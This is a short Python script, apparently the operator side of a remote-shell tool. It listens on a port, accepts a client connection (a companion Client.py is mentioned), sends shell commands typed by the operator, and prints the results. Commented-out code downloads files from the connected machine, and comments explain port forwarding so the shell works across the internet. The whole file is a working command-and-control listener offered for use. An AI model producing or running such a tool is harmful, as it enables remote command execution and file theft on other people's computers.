import socket
import sys
import os
import random
import string

h_name = socket.gethostname()
ipaddr = socket.gethostbyname(h_name)
HOST = sys.argv[1] if len(sys.argv) > 1 else ipaddr # Go into your Router settings to setup port forwarding if you want to use it outside of your local network
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Enter this port when asked which port is to be forwarded

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)

while True:
    print(f'[*] listening as {HOST}:{PORT}')
    client = s.accept()
    print(f'[*] Client connected {client[1]}')

    client[0].send('Welcome'.encode())
    while True:
        # cmd = input('╰─➤ ')
        # cmd = input('─➤ ')
        cmd = input('$ ')
        # cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        # if cmd.lower() in ['down', 'download']:
        #     sep = '#SEP#'
        #     which = input('File:\n')
        #     file1 = client[0].send(which.encode())
        #     file, file_size = client[0].recv(1024).decode().split(sep)
        #     file_name = os.path.basename(file)
        #     file_size = int(file_size)
        #     with open(file_name, 'wb') as f:
        #         bytes_recv = client[0].recv(1024)
        #         while bytes_recv:
        #             f.write(bytes_recv)
        #             bytes_recv = client[0].recv(1024)

        # To add your own command remove the # below and change alias with the command alias and command with the command name
        # Make sure to add it to Client.py as well
        # if cmd.lower() in ['alias', 'command']:   
            # output = client[0].recv(1024).decode()
            # print(f'your text here {output}')

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Wait for new client Y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
